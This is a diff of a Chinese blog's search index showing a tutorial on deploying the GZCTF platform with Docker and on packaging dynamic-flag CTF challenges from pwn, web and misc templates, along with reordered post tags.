 <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;XorKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;String2&gt;&quot;</span><span class="hljs-punctuation">,</span>					    <span class="hljs-comment">// 自定XorKey</span><br>  <span class="hljs-attr">&quot;ContainerProvider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Docker&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;PublicEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span><span class="hljs-punctuation">,</span>			<span class="hljs-comment">// 域名或IP配置，用于容器生成,域名不带http/https</span><br>    <span class="hljs-attr">&quot;DockerConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;SwarmMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span>								        <span class="hljs-comment">// 本地配置Docker因此此处置空</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;RequestLogging&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;DisableRateLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;RegistryConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ServerAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><br>    <span class="hljs-comment">//谷歌验证码配置</span><br>  <span class="hljs-attr">&quot;GoogleRecaptcha&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;VerifyAPIAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Sitekey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Secretkey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;RecaptchaThreshold&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.5&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight yml"><table><tr><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.0&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gzctf:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">gztime/gzctf:latest</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;GZCTF_ADMIN_PASSWORD=&lt;String3&gt;&quot;</span> <span class="hljs-comment"># &lt;String3&gt;换成管理员账户密码，账号为Admin</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;80:8080&quot;</span> <span class="hljs-comment"># 对外端口号，前为外部端口。</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/files:/app/uploads&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./logs:/app/log&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/keys:/root/.aspnet/DataProtection-Keys&quot;</span><br>      <span class="hljs-comment"># - &quot;./k8sconfig.yaml:/app/k8sconfig.yaml:ro&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br><br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:alpine</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;POSTGRES_PASSWORD=&lt;String1&gt;&quot;</span> <span class="hljs-comment"># 数据库密码，务必要和appsettings.json中的配置一致</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/db:/var/lib/postgresql/data&quot;</span><br><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">driver:</span> <span class="hljs-string">bridge</span><br>    <span class="hljs-attr">ipam:</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">subnet:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.12</span><span class="hljs-number">.0</span><span class="hljs-string">/24</span><br></code></pre></td></tr></table></figure>
+
+
+<p>修改完配置文件后运行<code>docker-compose up -d</code>命令即可</p>
+<p>注意密码的设置一定要符合复杂性要求，否则会报错</p>
+<h1 id="动态flag题目部署"><a href="#动态flag题目部署" class="headerlink" title="动态flag题目部署"></a>动态flag题目部署</h1><p>模板项目地址：<a href="https://github.com/dr0n1/CTF_Docker_Template">https://github.com/dr0n1/CTF_Docker_Template</a></p>
 <p>包含pwn系列的ubuntu16，ubuntu18，ubuntu20，ubuntu22<br>web系列的php，java，python，go，mysql<br>misc，reverse系列的部分动态</p>
 <p>因为不会crypto，就没写交互的crypto</p>
 <h2 id="pwn题部署"><a href="#pwn题部署" class="headerlink" title="pwn题部署"></a>pwn题部署</h2><blockquote>
-<p>包含<code>ubuntu16</code>，<code>ubuntu18</code>，<code>ubuntu20</code>，<code>ubuntu22</code>四个基础镜像模板</p>
+<p>包含了<code>ubuntu16</code>，<code>ubuntu18</code>，<code>ubuntu20</code>，<code>ubuntu22</code>四个基础模板</p>
 </blockquote>
 <p>假设现在出了一道pwn题，名字是baby_stack</p>
 <p>首先根据题目选择需要的Ubuntu版本，这里以Ubuntu16为例，下载<code>pwn_ubuntu16</code>这个模板</p>
@@ -5832,24 +5831,27 @@
 <p>nc连接后能返回程序的功能就ok了(别忘记删除容器)<br>接着在CTFd上部署，注意type选择direct，image与port对应即可</p>
 <p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-5.png"></p>
 <h2 id="web题部署"><a href="#web题部署" class="headerlink" title="web题部署"></a>web题部署</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><blockquote>
-<p><a href="https://github.com/lewiserii/CTFd_Template">CTFd_Template</a>展示了<code>web_apache-mysql-php5.4</code>  <code>web_apache-mysql-php7.4</code>  <code>web_apache-php5.3</code>  <code>web_apache-php7.3</code> 四个php模板。（如果需要其他版本的php环境，替换Dockerfile中的FROM命令即可）</p>
+<p>包含了<code>web_apache-mysql-php5.4</code>，<code>web_apache-mysql-php7.4</code>，<code>web_apache-php5.3</code>，<code>web_apache-php7.3</code> 四个php模板。（如果需要其他版本的php环境，替换Dockerfile中的FROM命令即可）</p>
 </blockquote>
 <p>1：将题目放入<code>src</code>目录下<br>2：根据题目选择flag位置，然后修改<code>start.sh</code><br>3：docker build</p>
 <p>在sql环境中注意替换flag位置即可（要一一对应）</p>
 <p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-8.png"></p>
 <p>如果需要使用php扩展，则修改或增加Dockerfile文件中的docker-php-ext-install命令如下即可，例如安装gettext扩展(web_apache-php7.3)</p>
-<figure class="highlight docker"><table><tr><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">FROM</span> php:<span class="hljs-number">7.3</span>-apache<br><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> Organization=<span class="hljs-string">&quot;Rml&quot;</span> Author=<span class="hljs-string">&quot;Lewiserii &lt;admin@lewiserii.top&gt;&quot;</span></span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> start.sh /start.sh</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> src/ /var/www/html/</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh \</span><br><span class="language-bash">	&amp;&amp; <span class="hljs-built_in">chown</span> -R www-data:www-data /var/www/html \</span><br><span class="language-bash">	&amp;&amp; docker-php-ext-install gettext</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight docker"><table><tr><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">FROM</span> php:<span class="hljs-number">7.3</span>-apache<br><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> Organization=<span class="hljs-string">&quot;Rml&quot;</span> Author=<span class="hljs-string">&quot;dr0n1 &lt;dr0n6666x@gmail.com&gt;&quot;</span></span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> start.sh /start.sh</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> src/ /var/www/html/</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> a2enmod rewrite \</span><br><span class="language-bash">	&amp;&amp; <span class="hljs-built_in">chmod</span> +x /start.sh \</span><br><span class="language-bash">	&amp;&amp; <span class="hljs-built_in">cp</span> /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini \</span><br><span class="language-bash">	&amp;&amp; <span class="hljs-built_in">chown</span> -R www-data:www-data /var/www/html</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure>
 
 
-<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>1：src中存放题目代码，注意命名app.py。如果使用了除flask外的第三方库，请在requirements.txt中标明<br>2：默认启动时不启用debug模式，如需要启用debug模式请修改start.sh</p>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><blockquote>
+<p>包含了<code>web_flask-python2.7</code>，<code>web_flask-python3.10</code> 两个python模板</p>
+</blockquote>
+<p>1：src中存放题目代码，注意命名app.py。如果使用了除flask外的第三方库，请在requirements.txt中标明<br>2：默认启动时不启用debug模式，如需要启用debug模式请修改start.sh</p>
 <p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-9.png"></p>
 <h2 id="misc题部署"><a href="#misc题部署" class="headerlink" title="misc题部署"></a>misc题部署</h2><blockquote>
-<p>包含<code>python2.7-alpine</code>，<code>python3.8-alpine</code>，<code>python3.9-httpd</code>三个镜像模板。利用<code>http.server</code>，<code>SimpleHTTPServer</code>和<code>httpd</code>启动一个web服务用来下载附件</p>
+<p>包含了<code>misc_python2.7</code>，<code>misc_python3.9</code>两个镜像模板。利用<code>http.server</code>，<code>SimpleHTTPServer</code>和<code>httpd</code>启动一个web服务用来下载附件</p>
 </blockquote>
 <blockquote>
 <p>个人认为动态misc的核心思路就是把出题过程转换为一个脚本，然后读取平台传递的flag后生成附件，利用web服务下载。所以部分工具题和复杂一点的题目是没有办法出动态的</p>
 </blockquote>
-<p>还是先根据需求选择不同的环境，这里以<code>misc_python3.9-httpd</code>为例</p>
+<p>还是先根据需求选择不同的环境，这里以<code>misc_python3.9</code>为例</p>
 <p><strong>第一步</strong>，先将出题思路写进一个脚本中，命名为<code>challenges.py</code>，所需的模块放到<code>requirements.txt</code>中</p>
 <p>这个脚本有几点需要注意：<br>1：需要从<code>/flag</code>读取flag值<br>2：出题后生成的附件需要套一层压缩包以便访问自动下载，zip需要命名为<code>attachment.zip</code><br>3：尽量在脚本结束时删除无用的文件</p>
 <p>以下是一个简单的例子</p>
@@ -6233,8 +6235,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>2021</tag>
         <tag>台州</tag>
+        <tag>2021</tag>
       </tags>
   </entry>
   <entry>
@@ -6324,8 +6326,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>nuaa</tag>
         <tag>2021</tag>
+        <tag>nuaa</tag>
       </tags>
   </entry>
   <entry>
@@ -6889,8 +6891,8 @@
         <category>awd</category>
       </categories>
       <tags>
-        <tag>awd</tag>
         <tag>docker</tag>
+        <tag>awd</tag>
       </tags>
   </entry>
   <entry>
@@ -6911,9 +6913,9 @@
         <category>wp</category>
       </categories>
       <tags>
+        <tag>buuctf</tag>
         <tag>sql</tag>
         <tag>fix</tag>
-        <tag>buuctf</tag>
       </tags>
   </entry>
   <entry>
@@ -7622,8 +7624,8 @@
         <category>linux</category>
       </categories>
       <tags>
-        <tag>汉明码</tag>
         <tag>基础</tag>
+        <tag>汉明码</tag>
       </tags>
   </entry>
   <entry>
@@ -8188,8 +8190,8 @@
         <category>wp</category>
       </categories>
       <tags>
-        <tag>buuctf</tag>
         <tag>misc</tag>
+        <tag>buuctf</tag>
       </tags>
   </entry>
   <entry>
@@ -8367,8 +8369,8 @@
         <category>wp</category>
       </categories>
       <tags>
-        <tag>buuctf</tag>
         <tag>misc</tag>
+        <tag>buuctf</tag>
       </tags>
   </entry>
   <entry>
@@ -8516,8 +8518,8 @@
         <category>wp</category>
       </categories>
       <tags>
-        <tag>buuctf</tag>
         <tag>misc</tag>
+        <tag>buuctf</tag>
       </tags>
   </entry>
 </search>
